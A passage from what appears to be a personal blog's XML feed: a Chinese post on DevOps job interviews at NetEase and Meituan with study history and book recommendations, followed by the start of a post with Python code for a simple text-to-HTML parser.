&#xFF0C;&#x5176;&#x4ED6;&#x7684;&#x8FDB;&#x7A0B;&#x5728;&#x5904;&#x7406;&#x8BE5;&#x4E8B;&#x4EF6;&#x5931;&#x8D25;&#x540E;&#x91CD;&#x65B0;&#x4F11;&#x7720;&#x3002;&#x8FD9;&#x79CD;&#x6027;&#x80FD;&#x6D6A;&#x8D39;&#x73B0;&#x8C61;&#x5C31;&#x662F;&#x60CA;&#x7FA4;&#x3002;&#xFF09;&#xFF1B;&#x5982;&#x4F55;&#x89E3;&#x60CA;&#x7FA4;&#x95EE;&#x9898;&#xFF1B;&#x56DE;&#x7B54;&#xFF08;&#x9501;&#xFF0C;&#x7EA2;&#x9ED1;&#x6811;&#xFF0C;&#x5B9A;&#x65F6;&#x5668;&#xFF09;</p><p>&#x4E8C;&#x9762;&#xFF1A;&#x9762;&#x8BD5;&#x5B98;&#x8FD8;&#x662F;&#x719F;&#x4EBA;&#xFF0C;&#x4F9D;&#x7136;&#x95EE;&#x9879;&#x76EE;&#xFF0C;&#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4;&#x7684;&#x5B9E;&#x73B0;&#xFF0C;&#x81EA;&#x5DF1;&#x5E73;&#x53F0;&#x7684;&#x4F18;&#x52BF;&#x548C;&#x7F3A;&#x70B9;&#xFF0C;&#x8BBE;&#x8BA1;&#x601D;&#x60F3;&#x3002;ansible/saltstack&#x7684;&#x6BD4;&#x8F83;&#xFF1B;&#x4ECE;&#x5404;&#x4E2A;&#x8FD0;&#x7EF4;&#x5DE5;&#x5177;&#x7684;&#x8BBE;&#x8BA1;&#x601D;&#x60F3;&#x7EC4;&#x4EF6;&#xFF0C;&#x7ED9;&#x8BB2;&#x4E86;&#xFF1B;&#x7136;&#x540E;&#x5C31;&#x8BA9;&#x6211;&#x95EE;&#x95EE;&#x9898;&#xFF0C;&#x6211;&#x5C31;&#x8BF4;&#x6211;&#x8FD8;&#x8981;&#x5B66;&#x4E60;&#x4EC0;&#x4E48;&#xFF0C;&#x8FD8;&#x6709;&#x4EC0;&#x4E48;&#x7F3A;&#x70B9;&#x3002;&#x9762;&#x8BD5;&#x5B98;&#x8BF4;&#x6211;&#x5728;&#x8FD0;&#x7EF4;&#x8FD9;&#x4E00;&#x5757;&#x5F88;&#x4F18;&#x79C0;&#xFF0C;&#x62C5;&#x5FC3;&#x6211;&#x57FA;&#x7840;&#xFF08;&#x975E;&#x4E13;&#x4E1A;&#xFF09;&#xFF1B;&#x7136;&#x540E;&#x6211;&#x5C31;&#x8BF4;&#x81EA;&#x5DF1;&#x5B66;&#x4E86;&#x4EC0;&#x4E48;&#x4E1C;&#x897F;&#xFF0C;&#x8BB2;&#x4E86;&#x81EA;&#x5DF1;&#x5B66;&#x4E60;&#x7684;&#x4E1C;&#x897F;&#x3002;&#x8BF4;&#x4E86;&#x4E00;&#x4E2A;&#x5C0F;&#x65F6;&#x591A;&#x5427;&#xFF0C;&#x9762;&#x8BD5;&#x5B98;&#x8054;&#x7CFB;&#x4E86;hr&#xFF0C;&#x7ED9;&#x6211;&#x5B89;&#x6392;&#x6700;&#x540E;&#x4E00;&#x8F6E;&#x9762;&#x8BD5;&#x3002;&#x7B49;&#x5230;7&#x70B9;&#x591A;&#xFF0C;hr&#x901A;&#x77E5;&#x6211;&#x53BB;&#x9762;&#x8BD5;&#x3002;</p><p>hr&#x9762;&#xFF1A;&#x538B;&#x529B;&#x9762;&#xFF0C;&#x5F88;&#x4E25;&#x8083;&#xFF0C;&#x95EE;&#x4E86;&#x5F88;&#x591A;&#x95EE;&#x9898;&#xFF0C;&#x5BF9;&#x6211;&#x5F88;&#x8D28;&#x7591;&#xFF0C;&#x6700;&#x540E;&#x5BF9;&#x6211;&#x8BF4;&#xFF0C;&#x524D;&#x9762;&#x4E24;&#x8F6E;&#x9762;&#x8BD5;&#x5B98;&#x5BF9;&#x6211;&#x8BC4;&#x4EF7;&#x5F88;&#x597D;&#xFF0C;&#x5979;&#x8981;&#x8003;&#x8651;&#x4E0B;&#xFF0C;&#x4E0B;&#x5468;&#x7ED9;&#x7B54;&#x590D;&#x3002;</p><p>&#x8D70;&#x51FA;&#x7F51;&#x6613;&#x5927;&#x53A6;&#x65F6;&#xFF0C;&#x5DEE;&#x4E0D;&#x591A;&#x662F;8&#x70B9;&#x4E86;&#xFF0C;&#x56DE;&#x5230;&#x4F4F;&#x7684;&#x5730;&#x65B9;10&#x70B9;&#x591A;&#xFF0C;&#x5403;&#x4E86;&#x70B9;&#x996D;&#xFF0C;&#x7761;&#x89C9;&#x3002;&#x7B2C;&#x4E8C;&#x5929;&#xFF0C;&#x56DE;&#x897F;&#x5B89;&#x3002;</p><p>&#x5468;&#x4E00;&#x4E0A;&#x8BFE;&#x65F6;&#xFF0C;9&#x70B9;&#x5DE6;&#x53F3;&#xFF0C;&#x624B;&#x673A;&#x9707;&#x52A8;&#xFF0C;&#x5FC3;&#x4E2D;&#x6709;&#x9884;&#x611F;&#xFF0C;&#x8D76;&#x7D27;&#x51FA;&#x6559;&#x5BA4;&#xFF0C;&#x7F51;&#x6613;hr&#x6253;&#x7684;&#x7535;&#x8BDD;&#x3002;<br>&#x7F51;&#x6613;&#x6E38;&#x620F;<br>&#x4E00;&#x9762;&#xFF1A; &#x7535;&#x8BDD;&#x9762;&#xFF0C;&#x4E24;&#x4E2A;&#x9762;&#x8BD5;&#x5B98;&#xFF0C;&#x5F88;nice&#x3002;&#x4E0A;&#x6765;&#x5C31;&#x95EE;tcp&#xFF0C;&#x628A;tcp&#x95EE;&#x4E86;&#x4E2A;&#x904D;&#xFF0C;&#x8FD8;&#x95EE;&#x4E86;linux&#x5185;&#x6838;3.0&#x4EE5;&#x540E;&#xFF0C;&#x5BF9;tcp&#x534F;&#x8BAE;&#x652F;&#x6301;&#xFF08;&#x5230;&#x73B0;&#x5728;&#x8FD8;&#x4E0D;&#x4F1A;&#xFF09;,vlan/vxlan&#xFF0C;&#x4E4B;&#x540E;&#x5C31;&#x662F;&#x5185;&#x6838;&#x53C2;&#x6570;&#xFF0C;&#x8FDB;&#x7A0B;vs&#x7EBF;&#x7A0B;&#xFF0C;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#xFF0C;&#x9879;&#x76EE;&#xFF0C;&#x6211;&#x7684;github,&#x535A;&#x5BA2;&#x3002;<br>&#x81EA;&#x5DF1;&#x4EE5;&#x4E3A;&#x6302;&#x4E86;&#xFF0C;&#x4E4B;&#x540E;&#x5341;&#x4E00;&#x524D;&#x6253;&#x7535;&#x8BDD;&#xFF0C;&#x901A;&#x77E5;&#x53BB;&#x5317;&#x4EAC;&#x9762;&#x8BD5;&#xFF0C;&#x672C;&#x6765;&#x60F3;&#x62D2;&#x7EDD;&#xFF0C;&#x4F46;&#x5305;&#x673A;&#x7968;&#xFF0C;&#x5C31;&#x7B54;&#x5E94;&#x4E86;&#x3002;</p><p>&#x4E8C;&#x9762;&#xFF1A;&#x73B0;&#x573A;&#x9762;&#xFF0C;&#x9879;&#x76EE;&#xFF0C;&#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4;&#x5DE5;&#x5177;&#x7684;&#x6BD4;&#x8F83;&#xFF08;&#x7B54;&#x7684;&#x5F88;&#x5DEE;&#xFF0C;&#x7136;&#x540E;&#x9762;&#x8BD5;&#x5B98;&#x8BF4;&#x4E86;&#x8981;&#x4ECE;&#x8BBE;&#x8BA1;&#x601D;&#x8DEF;&#xFF0C;&#x7EC4;&#x4EF6;&#x65B9;&#x9762;&#x56DE;&#x7B54;&#xFF0C;&#x4E0B;&#x5348;&#x7F51;&#x6613;&#x9762;&#x8BD5;&#x7528;&#x4E0A;&#x4E86;&#xFF09;&#x3002;<br>&#x5728;&#x6211;&#x63A5;&#x53D7;&#x4E86;&#x7F51;&#x6613;offer&#x540E;&#xFF0C;&#x628A;&#x4E09;&#x65B9;&#x90AE;&#x8FC7;&#x53BB;&#x540E;&#xFF0C;&#x7F51;&#x6613;&#x6E38;&#x620F;&#x518D;&#x6B21;&#x7EA6;&#x6211;&#x9762;&#x8BD5;&#x3002;</p><p>&#x7F8E;&#x56E2;<br>&#x9009;&#x62E9;&#x4E86;&#x7F8E;&#x56E2;&#xFF0C;&#x9519;&#x8FC7;&#x4E86;&#x767E;&#x5EA6;&#x548C;&#x641C;&#x72D7;&#xFF1B;&#x4F46;&#x7F8E;&#x56E2;&#x4F9D;&#x65E7;&#x62D2;&#x7EDD;&#x4E86;&#x6211;&#x3002;</p><p>&#x4E00;&#x9762;&#xFF1A; 11&#x70B9;40&#x591A;&#x9762;&#x8BD5;&#xFF0C;&#x5C31;&#x95EE;&#x4E86;&#x4E24;&#x4E2A;&#x7B97;&#x6CD5;&#x3002;</p><p>&#x4E8C;&#x9762;&#xFF1A; &#x7F51;&#x7EDC;&#xFF0C;mysql&#x7684;&#x4E8B;&#x52A1;&#xFF0C;&#x667A;&#x529B;&#x9898;</p><p>&#x4E09;&#x9762;&#xFF1A; &#x9879;&#x76EE;&#xFF0C;linux&#x57FA;&#x7840;&#x8003;&#x5BDF;</p><p>hr&#xFF1A;&#x963F;&#x91CC;&#x6708;&#x997C;</p><p>&#x5B66;&#x4E60;&#x5386;&#x7A0B;<br>&#x4E2A;&#x4EBA;&#x5B66;&#x4E60;<br>&#x63A5;&#x89E6;&#x8BA1;&#x7B97;&#x673A;&#x65B9;&#x9762;&#x77E5;&#x8BC6;&#x662F;&#x5728;&#x5927;&#x4E00;&#xFF0C;&#x5F53;&#x65F6;&#x53EA;&#x662F;&#x4E3A;&#x4E86;&#x8003;&#x4E2A;&#x4E8C;&#x7EA7;&#xFF0C;&#x83AB;&#x540D;&#x5176;&#x5999;&#x7684;&#x5165;&#x5751;&#x3002;&#x4ECE;&#x5927;&#x4E00;&#x5B66;&#x4E60;c&#x8BED;&#x8A00;&#x5427;&#xFF0C;&#x5F53;&#x65F6;&#x770B;&#x7684;&#x662F;&#x8C2D;&#x6D69;&#x5F3A;&#x7684;&#x4E66;&#xFF0C;&#x52C9;&#x5F3A;&#x5165;&#x95E8;&#x5427;&#xFF0C;&#x4E4B;&#x540E;&#x4E5F;&#x5C31;&#x770B;&#x4E86;&#x300A;c&#x4E0E;&#x6307;&#x9488;&#x300B;&#x4E4B;&#x7C7B;&#x7684;&#x4E66;&#x3002;&#x5927;&#x4E00;&#x6691;&#x5047;&#x5F00;&#x59CB;&#x5B66;C  ,&#x770B;&#x4E86;&#x4E00;&#x4E9B;C  &#x65B9;&#x9762;&#x7684;&#x4E66;&#xFF0C;&#x300A;C   primer&#x300B;&#xFF0C;&#x300A;&#x7F16;&#x7A0B;&#x601D;&#x60F3;&#x300B;&#xFF0C;&#x300A;c  &#x6C89;&#x601D;&#x5F55;&#x300B;&#xFF0C;&#x8FD8;&#x6709;&#x5BF9;&#x6211;&#x5F88;&#x6709;&#x5F71;&#x54CD;&#x7684;&#x300A;STL&#x6E90;&#x7801;&#x5256;&#x6790;&#x300B;&#x3002;&#x90A3;&#x65F6;&#x5019;&#xFF0C;&#x5BF9;&#x963F;&#x91CC;&#x6709;&#x79CD;&#x5411;&#x5F80;&#xFF0C;&#x60F3;&#x8FDB;&#x963F;&#x91CC;&#xFF0C;&#x7136;&#x540E;&#x5F00;&#x59CB;&#x5B66;java&#xFF0C;&#x4E5F;&#x770B;&#x4E86;&#x5F88;&#x591A;&#x4E66;&#xFF0C;&#x300A;java&#x7F16;&#x7A0B;&#x601D;&#x60F3;&#x300B;&#xFF0C;&#x300A;java web&#x5F00;&#x53D1;-&#x738B;&#x8005;&#x5F52;&#x6765;&#x300B;&#x4E4B;&#x7C7B;&#x7684;&#x3002;&#x7136;&#x540E;&#x5927;&#x4E8C;&#x5F00;&#x59CB;&#x6295;&#x4E86;&#x963F;&#x91CC;&#x548C;&#x817E;&#x8BAF;&#x3002;&#x817E;&#x8BAF;&#x8FDE;&#x7B14;&#x8BD5;&#x90FD;&#x6CA1;&#x8FC7;&#xFF0C;&#x963F;&#x91CC;&#x5C31;&#x9762;&#x4E86;&#x4E2A;java&#xFF0C;&#x5230;&#x4E8C;&#x9762;&#x6302;&#x4E86;&#xFF0C;&#x5F53;&#x65F6;&#x9887;&#x53D7;&#x6253;&#x51FB;&#x3002;&#x5F53;&#x65F6;&#x7B14;&#x8BD5;&#x9898;&#x6709;&#x597D;&#x591A;linux&#x7684;&#xFF0C;&#x7136;&#x540E;&#x5927;&#x4E8C;&#x6691;&#x5047;&#x5C31;&#x5F00;&#x59CB;&#x5B66;linux&#xFF0C;&#x4E00;&#x5F00;&#x59CB;&#x770B;&#x5B8C;&#x4E86;&#x300A;&#x9E1F;&#x54E5;&#x7684;linux&#x79C1;&#x623F;&#x83DC;&#x300B;&#xFF0C;&#x4E4B;&#x540E;&#x53C8;&#x662F;&#x5404;&#x79CD;linux&#x4E66;&#x7C4D;&#xFF0C;&#x5B66;shell&#xFF0C;&#x770B;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x770B;&#x67B6;&#x6784;&#x3002;&#x9009;&#x62E9;&#x8FD0;&#x7EF4;&#x662F;&#x4E2A;&#x610F;&#x5916;&#xFF0C;&#x4F46;&#x4E5F;&#x662F;&#x4E00;&#x79CD;&#x9003;&#x907F;&#x5427;&#x3002;&#x5927;&#x4E09;&#x4E00;&#x5E74;&#x5C31;&#x5728;linux&#x4E2D;&#x6323;&#x624E;&#xFF0C;&#x5F88;&#x75DB;&#x82E6;&#x3002;linux&#x5B66;&#x4E60;&#x4E2D;&#x53D1;&#x73B0;&#x8FD0;&#x7EF4;&#x7684;&#x9762;&#x5F88;&#x5E7F;&#xFF0C;&#x81EA;&#x5DF1;&#x5C31;&#x9009;&#x4E86;devops&#xFF0C;&#x770B;&#x4E86;&#x5F88;&#x591A;&#xFF0C;&#x4E5F;&#x5B66;&#x4E60;&#x4E86;&#x5F88;&#x591A;&#x3002;<br>&#x4E66;&#x7C4D;&#x63A8;&#x8350;<br>linux<br>&#x9E1F;&#x54E5;&#x79C1;&#x623F;&#x83DC;</p><p>&#x300A; Linux &#x5185;&#x6838;&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;&#x300B;</p><p>&#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;(&#x7B2C;2&#x7248;)&#x300B;</p><p>linux&#x5C31;&#x662F;&#x8FD9;&#x4E2A;&#x8303;&#x513F;</p><p>&#x300A;Linux&#x4E0E;Unix Shell &#x7F16;&#x7A0B;&#x6307;&#x5357;&#x300B;</p><p>&#x300A;unix&#x73AF;&#x5883;&#x9AD8;&#x7EA7;&#x7F16;&#x7A0B;&#x7B2C;&#x4E8C;&#x7248;&#x300B;&#x300A;unix&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;&#x300B;</p><p>&#x5B98;&#x65B9;&#x6587;&#x6863;</p><p>&#x7F51;&#x7EDC;<br>TCP&#x534F;&#x8BAE;&#x65CF;</p><p>TCP&#x8BE6;&#x89E3;&#xFF08;1&#xFF0C;2&#xFF0C;3&#xFF09;</p><p>&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;<br>&#x73B0;&#x4EE3;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;</p><p>&#x6DF1;&#x5165;&#x7406;&#x89E3;&#x8BA1;&#x7B97;&#x673A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;</p><p>&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x6982;&#x5FF5;</p><p>&#x5927;&#x6570;&#x636E;<br>hadoop&#x6838;&#x5FC3;&#x6280;&#x672F;</p><p>Hadoop&#x6743;&#x5A01;&#x6307;&#x5357;</p><p>&#x300A;Hadoop&#x6280;&#x672F;&#x5185;&#x5E55;-&#x6DF1;&#x5165;&#x89E3;&#x6790;MapReduce&#x67B6;&#x6784;&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;&#x539F;&#x7406;&#x300B;&#x548C;&#x300A;Hadoop&#x6280;&#x672F;&#x5185;&#x5E55;-&#x6DF1;&#x5165;&#x89E3;&#x6790;Hadoop Common&#x548C;HDFS&#x67B6;&#x6784;&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;&#x539F;&#x7406;&#x300B;</p><p>&#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4;<br>python&#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4;</p><p>saltstack&#x6280;&#x672F;&#x5165;&#x95E8;&#x4E0E;&#x5B9E;&#x6218;</p><p>ansible&#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4;</p><p>&#x5927;&#x516C;&#x53F8;&#x5F88;&#x770B;&#x91CD;&#x57FA;&#x7840;&#xFF0C;&#x591A;&#x770B;&#x770B;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#xFF0C;&#x7F51;&#x7EDC;&#x3002;</p><p>&#x672A;&#x5B8C;&#x5F85;&#x7EED;</p><hr><p>&#x770B;&#x8FC7;&#x4E4B;&#x540E;&#x611F;&#x89C9;&#x81EA;&#x5DF1;&#x771F;&#x7684;&#x5F88;&#x5F31;&#xFF0C;&#x8981;&#x52AA;&#x529B;&#x7684;&#x5730;&#x65B9;&#x8FD8;&#x6709;&#x5F88;&#x591A;&#x2026;&#x2026;</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> life </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python text parser</title>
      <link href="/2018/10/16/Python-text-parser/"/>
      <url>/2018/10/16/Python-text-parser/</url>
      
        <content type="html"><![CDATA[<p><img src="http://p4wiqzx0i.bkt.clouddn.com/ncn70.jpg" alt=""></p><a id="more"></a><p>util.py<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rule</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &#x89C4;&#x5219;&#x7236;&#x7C7B;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">action</span><span class="params">(self, block, handler)</span>:</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &#x52A0;&#x6807;&#x8BB0;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        handler.start(self.type)</span><br><span class="line">        handler.feed(block)</span><br><span class="line">        handler.end(self.type)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HeadingRule</span><span class="params">(Rule)</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &#x4E00;&#x53F7;&#x6807;&#x9898;&#x89C4;&#x5219;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    type = <span class="string">&apos;heading&apos;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">condition</span><span class="params">(self, block)</span>:</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &#x5224;&#x65AD;&#x6587;&#x672C;&#x5757;&#x662F;&#x5426;&#x7B26;&#x5408;&#x89C4;&#x5219;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">not</span> <span class="string">&apos;\n&apos;</span> <span class="keyword">in</span> block <span class="keyword">and</span> len(block) &lt;= <span class="number">70</span> <span class="keyword">and</span> <span class="keyword">not</span> block[<span class="number">-1</span>] == <span class="string">&apos;:&apos;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TitleRule</span><span class="params">(HeadingRule)</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &#x4E8C;&#x53F7;&#x6807;&#x9898;&#x89C4;&#x5219;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    type = <span class="string">&apos;title&apos;</span></span><br><span class="line">    first = <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">condition</span><span class="params">(self, block)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.first: <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        self.first = <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">return</span> HeadingRule.condition(self, block);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListItemRule</span><span class="params">(Rule)</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &#x5217;&#x8868;&#x9879;&#x89C4;&#x5219;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    type = <span class="string">&apos;listitem&apos;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">condition</span><span class="params">(self, block)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> block[<span class="number">0</span>] == <span class="string">&apos;-&apos;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">action</span><span class="params">(self, block, handler)</span>:</span></span><br><span class="line">        handler.start(self.type)</span><br><span class="line">        handler.feed(block[<span class="number">1</span>:].strip())</span><br><span class="line">        handler.end(self.type)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListRule</span><span class="params">(ListItemRule)</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &#x5217;&#x8868;&#x89C4;&#x5219;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    type = <span class="string">&apos;list&apos;</span></span><br><span class="line">    inside = <span class="keyword">False</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">condition</span><span class="params">(self, block)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">action</span><span class="params">(self, block, handler)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.inside <span class="keyword">and</span> ListItemRule.condition(self, block):</span><br><span class="line">            handler.start(self.type)</span><br><span class="line">            self.inside = <span class="keyword">True</span></span><br><span class="line">        <span class="keyword">elif</span> self.inside <span class="keyword">and</span> <span class="keyword">not</span> ListItemRule.condition(self, block):</span><br><span class="line">            handler.end(self.type)</span><br><span class="line">            self.inside = <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ParagraphRule</span><span class="params">(Rule)</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &#x6BB5;&#x843D;&#x89C4;&#x5219;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    type = <span class="string">&apos;paragraph&apos;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">condition</span><span class="params">(self, block)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>headlers.py<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handler</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &#x5904;&#x7406;&#x7A0B;&#x5E8F;&#x7236;&#x7C7B;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">callback</span><span class="params">(self, prefix, name, *args)</span>:</span></span><br><span class="line">        method = getattr(self, prefix + name, <span class="keyword">None</span>)</span><br><span class="line">        <span class="keyword">if</span> callable(method): <span class="keyword">return</span> method(*args)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        self.callback(<span class="string">&apos;start_&apos;</span>, name)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">end</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        self.callback(<span class="string">&apos;end_&apos;</span>, name)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sub</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">substitution</span><span class="params">(match)</span>:</span></span><br><span class="line">            result = self.callback(<span class="string">&apos;sub_&apos;</span>, name, match)</span><br><span class="line">            <span class="keyword">if</span> result <span class="keyword">is</span> <span class="keyword">None</span>: result = match.group(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        <span class="keyword">return</span> substitution</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HTMLRenderer</span><span class="params">(Handler)</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    